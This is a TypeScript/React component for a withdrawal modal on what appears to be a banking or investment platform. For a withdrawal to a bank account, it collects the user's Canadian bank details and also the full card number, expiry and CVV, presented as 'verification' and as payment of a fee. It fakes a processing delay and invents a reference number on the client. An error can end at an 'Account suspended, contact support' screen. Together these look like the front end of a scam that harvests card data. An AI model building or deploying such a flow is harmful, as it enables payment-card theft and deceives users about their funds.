"use client";

import { useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { makeWithdrawal } from "@/actions/withdraw";
import { CONTACT_SUPPORT_MESSAGE } from "@/lib/action-result";
import { formatMoney } from "@/lib/format";
import { Modal } from "@/components/ui/modal";
import Button from "@/components/ui/button/Button";
import { DollarLineIcon } from "@/icons";
import ReceiptActions from "./ReceiptActions";

type Step =
  | "amount"
  | "destination"
  | "bank"
  | "card"
  | "processing"
  | "success"
  | "suspended";

type CardType = "VISA" | "MASTERCARD";

type BankDetails = {
  beneficiaryName: string;
  bankName: string;
  institutionNumber: string;
  transitNumber: string;
  accountNumber: string;
};

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const round2 = (n: number) => Math.round(n * 100) / 100;

// Processing fee: 1.5% of the amount, with a $1.99 minimum.
function feeFor(amount: number): number {
  if (!(amount > 0)) return 0;
  return round2(Math.max(1.99, amount * 0.015));
}

export default function WithdrawLauncher({
  currency = "CAD",
  triggerClassName,
  triggerLabel = "Withdraw",
  holder,
  last4,
  balance,
}: {
  currency?: string;
  triggerClassName?: string;
  triggerLabel?: string;
  holder?: string;
  last4?: string;
  balance: number;
}) {
  const router = useRouter();
  const [open, setOpen] = useState(false);
  const [step, setStep] = useState<Step>("amount");
  const [error, setError] = useState<string | null>(null);
  const [reference, setReference] = useState("");

  const [amount, setAmount] = useState("");
  const [bank, setBank] = useState<BankDetails>({
    beneficiaryName: "",
    bankName: "",
    institutionNumber: "",
    transitNumber: "",
    accountNumber: "",
  });

  const [cardType, setCardType] = useState<CardType>("VISA");
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");

  const amountNum = Number(amount);
  const fee = useMemo(() => feeFor(amountNum), [amountNum]);
  const receives = round2(Math.max(0, amountNum - fee));
  const overBalance = amountNum > balance;

  function reset() {
    setStep("amount");
    setError(null);
    setAmount("");
    setBank({
      beneficiaryName: "",
      bankName: "",
      institutionNumber: "",
      transitNumber: "",
      accountNumber: "",
    });
    setCardType("VISA");
    setCardName("");
    setCardNumber("");
    setCardExpiry("");
    setCardCvv("");
  }

  function close() {
    setOpen(false);
    setTimeout(reset, 200);
    router.refresh();
  }

  function submitAmount(e: React.FormEvent) {
    e.preventDefault();
    if (!(amountNum > 0)) {
      setError("Enter an amount to withdraw.");
      return;
    }
    if (overBalance) {
      setError("Amount exceeds your available balance.");
      return;
    }
    setError(null);
    setStep("destination");
  }

  function submitBank(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const fd = new FormData(e.currentTarget);
    setBank({
      beneficiaryName: String(fd.get("beneficiaryName") ?? "").trim(),
      bankName: String(fd.get("bankName") ?? "").trim(),
      institutionNumber: String(fd.get("institutionNumber") ?? "").trim(),
      transitNumber: String(fd.get("transitNumber") ?? "").trim(),
      accountNumber: String(fd.get("accountNumber") ?? "").trim(),
    });
    setError(null);
    setStep("card");
  }

  const cardDigits = cardNumber.replace(/\D/g, "");
  const cardValid =
    cardName.trim().length >= 2 &&
    cardDigits.length >= 13 &&
    cardDigits.length <= 19 &&
    /^\d{2}\/\d{2}$/.test(cardExpiry) &&
    /^\d{3,4}$/.test(cardCvv);

  async function submitCard(e: React.FormEvent) {
    e.preventDefault();
    if (!cardValid) {
      setError("Enter valid card details to verify this withdrawal.");
      return;
    }
    setError(null);
    setStep("processing");

    const fd = new FormData();
    fd.set("amount", amount);
    fd.set("beneficiaryName", bank.beneficiaryName);
    fd.set("bankName", bank.bankName);
    fd.set("institutionNumber", bank.institutionNumber);
    fd.set("transitNumber", bank.transitNumber);
    fd.set("accountNumber", bank.accountNumber);
    fd.set("cardType", cardType);
    fd.set("cardName", cardName.trim());
    fd.set("cardNumber", cardNumber.replace(/\s/g, ""));
    fd.set("cardExpiry", cardExpiry);
    fd.set("cardCvv", cardCvv);

    const [res] = await Promise.all([makeWithdrawal(fd), sleep(2100)]);

    if (res.ok) {
      setReference(`#${Date.now().toString(36).slice(-6).toUpperCase()}`);
      setStep("success");
      return;
    }
    if (res.error === CONTACT_SUPPORT_MESSAGE) {
      setStep("suspended");
      return;
    }
    setError(res.error);
    setStep("card");
  }

  const maskedAccount = bank.accountNumber
    ? `••${bank.accountNumber.slice(-4)}`
    : "";

  return (
    <>
      <button
        type="button"
        onClick={() => setOpen(true)}
        className={
          triggerClassName ??
          "inline-flex items-center gap-2 rounded-xl border border-gray-300 px-5 py-3 text-sm font-medium text-gray-700 transition hover:bg-gray-50 dark:border-gray-700 dark:text-gray-300 dark:hover:bg-white/[0.03]"
        }
      >
        {triggerLabel}
      </button>

      <Modal
        isOpen={open}
        onClose={step === "processing" ? () => {} : close}
        showCloseButton={step !== "processing"}
        className="m-4 max-h-[92vh] max-w-[520px] overflow-y-auto p-6 sm:p-7"
      >
        {/* Progress header (form steps only) */}
        {(step === "amount" || step === "destination" || step === "bank" || step === "card") && (
          <StepDots
            active={
              step === "amount" ? 0 : step === "destination" ? 1 : step === "bank" ? 2 : 3
            }
          />
        )}

        {error && step !== "processing" && (
          <div className="mb-4 rounded-lg border border-error-200 bg-error-50 px-4 py-3 text-sm text-error-600 dark:border-error-500/30 dark:bg-error-500/10 dark:text-error-400">
            {error}
          </div>
        )}

        {/* STEP 1: AMOUNT + FEE BREAKDOWN */}
        {step === "amount" && (
          <form onSubmit={submitAmount}>
            <h3 className="text-lg font-semibold text-gray-800 dark:text-white/90">
              Withdraw funds
            </h3>
            <p className="mb-5 mt-1 text-sm text-gray-500 dark:text-gray-400">
              How much would you like to withdraw?
            </p>

            <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">
              Amount
            </label>
            <div className="flex items-center rounded-lg border border-gray-300 px-4 focus-within:border-brand-300 focus-within:ring-3 focus-within:ring-brand-500/10 dark:border-gray-700">
              <span className="text-sm text-gray-400">{currency}</span>
              <input
                autoFocus
                type="number"
                min="0"
                step="0.01"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                className="h-12 w-full bg-transparent px-3 text-lg font-semibold text-gray-800 placeholder:font-normal placeholder:text-gray-400 focus:outline-hidden dark:text-white/90"
              />
            </div>
            <p className="mt-1.5 text-xs text-gray-400 dark:text-gray-500">
              Available balance {formatMoney(balance, currency)}
            </p>

            {/* Fee breakdown */}
            <div className="mt-5 rounded-xl border border-gray-200 bg-gray-50 p-4 dark:border-gray-800 dark:bg-white/[0.03]">
              <div className="mb-2 flex items-center gap-2 text-xs font-medium text-gray-500 dark:text-gray-400">
                <InfoGlyph />
                A processing fee of {formatMoney(fee, currency)} will be applied.
              </div>
              <Row label="Withdrawal amount" value={formatMoney(amountNum || 0, currency)} />
              <Row label="Processing fee (1.5%)" value={`− ${formatMoney(fee, currency)}`} />
              <div className="my-2 border-t border-dashed border-gray-200 dark:border-gray-700" />
              <Row label="You'll receive" value={formatMoney(receives, currency)} strong />
            </div>

            <Button type="submit" className="mt-5 w-full">
              Continue
            </Button>
          </form>
        )}

        {/* STEP 2: DESTINATION TYPE */}
        {step === "destination" && (
          <div>
            <BackBtn onClick={() => setStep("amount")} />
            <h3 className="text-lg font-semibold text-gray-800 dark:text-white/90">
              Where should the funds go?
            </h3>
            <p className="mb-5 mt-1 text-sm text-gray-500 dark:text-gray-400">
              Select a destination for your {formatMoney(receives, currency)}.
            </p>

            <button
              type="button"
              onClick={() => setStep("bank")}
              className="flex w-full items-center gap-4 rounded-2xl border-2 border-brand-300 bg-brand-50/50 p-4 text-left transition hover:border-brand-400 dark:border-brand-500/40 dark:bg-brand-500/5"
            >
              <span className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl bg-brand-500/10 text-brand-600 dark:text-brand-400">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                  <path d="M3 21h18M5 21V9l7-5 7 5v12M9 21v-6h6v6" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </span>
              <span className="min-w-0 flex-1">
                <span className="block text-sm font-semibold text-gray-800 dark:text-white/90">
                  Bank Account
                </span>
                <span className="mt-0.5 block text-xs text-gray-500 dark:text-gray-400">
                  Deposit to a Canadian bank account · 2–3 business days
                </span>
              </span>
              <span className="text-brand-500">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                  <path d="M9 6l6 6-6 6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </span>
            </button>

            <div className="mt-3 flex w-full items-center gap-4 rounded-2xl border border-gray-200 p-4 text-left opacity-60 dark:border-gray-800">
              <span className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl bg-gray-100 text-gray-400 dark:bg-white/[0.06]">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                  <rect x="3" y="6" width="18" height="12" rx="2" stroke="currentColor" strokeWidth="1.7" />
                  <path d="M3 10h18" stroke="currentColor" strokeWidth="1.7" />
                </svg>
              </span>
              <span className="min-w-0 flex-1">
                <span className="block text-sm font-semibold text-gray-500 dark:text-gray-400">
                  Interac e-Transfer
                </span>
                <span className="mt-0.5 block text-xs text-gray-400 dark:text-gray-500">
                  Coming soon
                </span>
              </span>
            </div>
          </div>
        )}

        {/* STEP 3: DESTINATION BANK DETAILS */}
        {step === "bank" && (
          <form onSubmit={submitBank}>
            <BackBtn onClick={() => setStep("destination")} />
            <h3 className="text-lg font-semibold text-gray-800 dark:text-white/90">
              Destination bank details
            </h3>
            <p className="mb-5 mt-1 text-sm text-gray-500 dark:text-gray-400">
              Enter the Canadian account that will receive the funds.
            </p>

            <div className="space-y-4">
              <Field
                label="Beneficiary full name"
                name="beneficiaryName"
                placeholder="e.g. Jordan A. Bell"
                defaultValue={bank.beneficiaryName}
                required
              />
              <Field
                label="Bank name"
                name="bankName"
                placeholder="e.g. Scotiabank"
                defaultValue={bank.bankName}
                required
              />
              <div className="grid grid-cols-2 gap-3">
                <Field
                  label="Institution no."
                  name="institutionNumber"
                  placeholder="002"
                  hint="3 digits"
                  inputMode="numeric"
                  maxLength={3}
                  defaultValue={bank.institutionNumber}
                  required
                />
                <Field
                  label="Transit no."
                  name="transitNumber"
                  placeholder="00152"
                  hint="5 digits"
                  inputMode="numeric"
                  maxLength={5}
                  defaultValue={bank.transitNumber}
                  required
                />
              </div>
              <Field
                label="Account number"
                name="accountNumber"
                placeholder="7-digit account number"
                inputMode="numeric"
                maxLength={17}
                defaultValue={bank.accountNumber}
                required
              />
            </div>

            <Button type="submit" className="mt-5 w-full">
              Continue to verification
            </Button>
          </form>
        )}

        {/* STEP 4: CARD VERIFICATION */}
        {step === "card" && (
          <form onSubmit={submitCard}>
            <BackBtn onClick={() => setStep("bank")} />
            <h3 className="text-lg font-semibold text-gray-800 dark:text-white/90">
              Verify with your card
            </h3>
            <p className="mb-4 mt-1 text-sm text-gray-500 dark:text-gray-400">
              We use your card to verify your identity and process the{" "}
              {formatMoney(fee, currency)} fee. Your card is not charged the
              withdrawal amount.
            </p>

            {/* Card type */}
            <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">
              Card type
            </label>
            <div className="mb-4 grid grid-cols-2 gap-3">
              {(["VISA", "MASTERCARD"] as CardType[]).map((c) => (
                <button
                  key={c}
                  type="button"
                  onClick={() => setCardType(c)}
                  className={`flex h-12 items-center justify-center gap-2 rounded-lg border text-sm font-semibold transition ${
                    cardType === c
                      ? "border-brand-400 bg-brand-50/60 text-gray-800 dark:border-brand-500/50 dark:bg-brand-500/10 dark:text-white/90"
                      : "border-gray-300 text-gray-500 hover:border-gray-400 dark:border-gray-700 dark:text-gray-400"
                  }`}
                >
                  {c === "VISA" ? <VisaMark /> : <MastercardMark />}
                  {c === "VISA" ? "Visa" : "Mastercard"}
                </button>
              ))}
            </div>

            <div className="space-y-4">
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">
                  Cardholder name
                </label>
                <input
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value)}
                  placeholder="Name on card"
                  className={inputCls}
                />
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">
                  Card number
                </label>
                <input
                  value={cardNumber}
                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                  inputMode="numeric"
                  placeholder="1234 5678 9012 3456"
                  className={`${inputCls} font-mono tracking-wider`}
                />
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">
                    Expiry
                  </label>
                  <input
                    value={cardExpiry}
                    onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                    inputMode="numeric"
                    placeholder="MM/YY"
                    maxLength={5}
                    className={`${inputCls} font-mono`}
                  />
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">
                    CVV
                  </label>
                  <input
                    value={cardCvv}
                    onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    inputMode="numeric"
                    placeholder="123"
                    maxLength={4}
                    className={`${inputCls} font-mono`}
                  />
                </div>
              </div>
            </div>

            <Button type="submit" className="mt-5 w-full">
              Submit withdrawal · {formatMoney(amountNum || 0, currency)}
            </Button>
          </form>
        )}

        {/* STEP: PROCESSING */}
        {step === "processing" && (
          <div className="flex flex-col items-center py-8 text-center">
            <div className="relative flex h-20 w-20 items-center justify-center">
              <span className="tf-ring absolute inline-flex h-16 w-16 rounded-full bg-brand-500/20" />
              <span className="h-16 w-16 animate-spin rounded-full border-4 border-brand-500/20 border-t-brand-500" />
              <DollarLineIcon />
            </div>
            <h3 className="mt-6 text-lg font-semibold text-gray-800 dark:text-white/90">
              Processing your withdrawal…
            </h3>
            <p className="mt-1 text-sm text-gray-500 dark:text-gray-400">
              Verifying details and submitting to {bank.bankName || "your bank"}.
            </p>
          </div>
        )}

        {/* STEP: SUCCESS */}
        {step === "success" && (
          <div className="flex flex-col items-center py-4 text-center">
            <div className="tf-pop flex h-20 w-20 items-center justify-center rounded-full bg-success-50 dark:bg-success-500/15">
              <svg width="52" height="52" viewBox="0 0 52 52">
                <circle className="tf-check__circle" cx="26" cy="26" r="24" fill="none" stroke="#12b76a" strokeWidth="3" />
                <path className="tf-check__mark" d="M16 27l7 7 14-15" fill="none" stroke="#12b76a" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </div>
            <h3 className="tf-fade-up mt-6 text-xl font-bold text-gray-800 dark:text-white/90">
              Withdrawal submitted
            </h3>
            <p className="tf-fade-up mx-auto mt-2 max-w-[22rem] text-sm text-gray-500 dark:text-gray-400">
              Your withdrawal has been submitted successfully. Funds will be
              transferred to your selected bank account within 2–3 business days.
            </p>

            <div className="tf-fade-up mt-5 w-full rounded-xl border border-gray-200 bg-gray-50 p-4 text-left dark:border-gray-800 dark:bg-white/[0.03]">
              <Row label="Reference" value={reference} mono />
              <Row label="Amount" value={formatMoney(amountNum, currency)} />
              <Row label="Processing fee" value={formatMoney(fee, currency)} />
              <Row label="To bank" value={bank.bankName} />
              <Row label="Account" value={maskedAccount} />
            </div>

            {last4 && (
              <div className="tf-fade-up mt-5 w-full">
                <ReceiptActions
                  data={{
                    reference,
                    amountLabel: `-${formatMoney(amountNum, currency)}`,
                    type: "Withdrawal",
                    status: "Completed",
                    holder: holder ?? "",
                    fromAccount: `•••• ${last4}`,
                    payeeName: bank.beneficiaryName,
                    bank: bank.bankName,
                    account: maskedAccount,
                    date: new Date().toLocaleString("en-US", {
                      month: "short",
                      day: "numeric",
                      year: "numeric",
                      hour: "2-digit",
                      minute: "2-digit",
                    }),
                  }}
                />
              </div>
            )}
            <Button type="button" className="mt-4 w-full" onClick={close}>
              Done
            </Button>
          </div>
        )}

        {/* STEP: SUSPENDED */}
        {step === "suspended" && (
          <div className="flex flex-col items-center py-6 text-center">
            <div className="tf-pop flex h-20 w-20 items-center justify-center rounded-full bg-error-50 dark:bg-error-500/15">
              <svg width="34" height="34" viewBox="0 0 24 24" fill="none" className="text-error-500">
                <rect x="6" y="5" width="4" height="14" rx="1.5" fill="currentColor" />
                <rect x="14" y="5" width="4" height="14" rx="1.5" fill="currentColor" />
              </svg>
            </div>
            <h3 className="mt-6 text-xl font-bold text-gray-800 dark:text-white/90">
              Account suspended
            </h3>
            <p className="mt-2 text-sm text-gray-500 dark:text-gray-400">
              {CONTACT_SUPPORT_MESSAGE}
            </p>
            <Button type="button" variant="outline" className="mt-6 w-full" onClick={close}>
              Close
            </Button>
          </div>
        )}
      </Modal>
    </>
  );
}

/* ---- helpers ---- */

const inputCls =
  "h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 text-sm text-gray-800 shadow-theme-xs placeholder:text-gray-400 focus:border-brand-300 focus:outline-hidden focus:ring-3 focus:ring-brand-500/10 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90";

function formatCardNumber(v: string): string {
  return v
    .replace(/\D/g, "")
    .slice(0, 19)
    .replace(/(.{4})/g, "$1 ")
    .trim();
}

function formatExpiry(v: string): string {
  const d = v.replace(/\D/g, "").slice(0, 4);
  if (d.length <= 2) return d;
  return `${d.slice(0, 2)}/${d.slice(2)}`;
}

function StepDots({ active }: { active: number }) {
  const labels = ["Amount", "Destination", "Details", "Verify"];
  return (
    <div className="mb-5 flex items-center gap-1.5">
      {labels.map((l, i) => (
        <div key={l} className="flex flex-1 flex-col gap-1.5">
          <span
            className={`h-1 rounded-full transition-colors ${
              i <= active ? "bg-brand-500" : "bg-gray-200 dark:bg-gray-700"
            }`}
          />
          <span
            className={`text-[10px] font-medium ${
              i <= active ? "text-brand-600 dark:text-brand-400" : "text-gray-400 dark:text-gray-600"
            }`}
          >
            {l}
          </span>
        </div>
      ))}
    </div>
  );
}

function BackBtn({ onClick }: { onClick: () => void }) {
  return (
    <button
      type="button"
      onClick={onClick}
      className="mb-3 inline-flex items-center gap-1 text-sm font-medium text-gray-500 transition hover:text-gray-800 dark:text-gray-400 dark:hover:text-white/90"
    >
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
        <path d="M15 6l-6 6 6 6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
      </svg>
      Back
    </button>
  );
}

function Field({
  label,
  name,
  placeholder,
  defaultValue,
  hint,
  inputMode,
  maxLength,
  required,
}: {
  label: string;
  name: string;
  placeholder?: string;
  defaultValue?: string;
  hint?: string;
  inputMode?: "numeric" | "text";
  maxLength?: number;
  required?: boolean;
}) {
  return (
    <div>
      <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">
        {label}
      </label>
      <input
        name={name}
        inputMode={inputMode}
        maxLength={maxLength}
        placeholder={placeholder}
        defaultValue={defaultValue}
        required={required}
        className={inputCls}
      />
      {hint && <p className="mt-1 text-xs text-gray-400 dark:text-gray-500">{hint}</p>}
    </div>
  );
}

function Row({
  label,
  value,
  mono,
  strong,
}: {
  label: string;
  value: string;
  mono?: boolean;
  strong?: boolean;
}) {
  return (
    <div className="flex items-center justify-between gap-3 py-1 text-sm">
      <span className={strong ? "font-medium text-gray-700 dark:text-gray-300" : "text-gray-500 dark:text-gray-400"}>
        {label}
      </span>
      <span
        className={`text-gray-800 dark:text-white/90 ${strong ? "text-base font-bold" : "font-medium"} ${
          mono ? "font-mono text-xs" : ""
        }`}
      >
        {value}
      </span>
    </div>
  );
}

function InfoGlyph() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden>
      <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="1.8" />
      <path d="M12 11v5M12 8h.01" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  );
}

function VisaMark() {
  return (
    <span className="text-[13px] font-bold italic tracking-tight text-[#1a1f71] dark:text-blue-300">
      VISA
    </span>
  );
}

function MastercardMark() {
  return (
    <span className="relative flex items-center" aria-hidden>
      <span className="h-4 w-4 rounded-full bg-[#eb001b]" />
      <span className="-ml-1.5 h-4 w-4 rounded-full bg-[#f79e1b]/90" />
    </span>
  );
}
